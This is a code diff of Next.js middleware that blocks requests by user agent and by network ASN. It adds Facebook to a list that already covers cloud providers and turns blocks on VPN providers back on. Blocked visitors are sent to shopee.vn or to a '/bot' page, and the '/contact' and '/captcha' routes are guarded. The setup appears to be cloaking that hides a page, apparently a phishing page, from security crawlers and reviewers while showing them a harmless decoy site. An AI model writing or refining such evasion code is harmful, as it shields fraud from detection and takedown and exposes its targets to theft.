@@ -6,6 +6,7 @@ const BLOCKED_ASN = new Set([
     // Cloud Providers
     15169, // Google Cloud
     396982, // Google Cloud / Google LLC
+    32934, // Facebook
     8075, // Microsoft Azure
     16509, // Amazon AWS
     16510, // Amazon AWS
@@ -30,14 +31,14 @@ const BLOCKED_ASN = new Set([
     36947, // Telecom Algeria
 
     // VPN Providers
-    // 212238, // Datacamp Limited
-    // 60068, // Datacamp
-    // 136787, // PacketHub S.A.
-    // 62240, // Clouvider
-    // 9009, // M247 Europe SRL
-    // 208172, // Proton AG (ProtonVPN)
-    // 131199, // Nexeon Technologies, Inc.
-    // 21859, // Zenlayer Inc
+    212238, // Datacamp Limited
+    60068, // Datacamp
+    136787, // PacketHub S.A.
+    62240, // Clouvider
+    9009, // M247 Europe SRL
+    208172, // Proton AG (ProtonVPN)
+    131199, // Nexeon Technologies, Inc.
+    21859, // Zenlayer Inc
 
     // Proxy / Hosting
     55720, // Gigabit Hosting
@@ -79,21 +80,24 @@ const getGeoInfo = async (ip: string): Promise<GeoInfo | null> => {
     }
 };
 
-export const proxy = async (req: NextRequest) => {
+const SHOPEE_URL = 'https://shopee.vn/';
+
+const middleware = async (req: NextRequest) => {
     const ua = req.headers.get('user-agent');
+    const host = req.headers.get('x-forwarded-host') || req.headers.get('host');
     const { pathname } = req.nextUrl;
 
-    const ip = req.headers.get('cf-connecting-ip') || req.headers.get('x-nf-client-connection-ip') || req.headers.get('x-forwarded-for')?.split(',')[0].trim() || req.headers.get('x-real-ip') || 'unknown';
+    const ip = req.headers.get('x-real-ip') || req.headers.get('x-forwarded-for')?.split(',')[0].trim() || 'unknown';
 
     if (!ua || BLOCKED_UA_REGEX.test(ua)) {
-        return new NextResponse(null, { status: 404 });
+        return NextResponse.rewrite(`https://${host}/bot`);
     }
 
     if (ip !== 'unknown') {
         const geoInfo = await getGeoInfo(ip);
         if (geoInfo) {
             if (geoInfo.asn && BLOCKED_ASN.has(geoInfo.asn)) {
-                return new NextResponse(null, { status: 404 });
+                return NextResponse.redirect(SHOPEE_URL);
             }
         }
     }
@@ -112,9 +116,11 @@ export const proxy = async (req: NextRequest) => {
         return NextResponse.next();
     }
 
-    return new NextResponse(null, { status: 404 });
+    return NextResponse.redirect(SHOPEE_URL);
 };
 
+export default middleware;
+
 export const config = {
-    matcher: ['/contact/:path*', '/help']
+    matcher: ['/contact/:path*', '/captcha']
 };
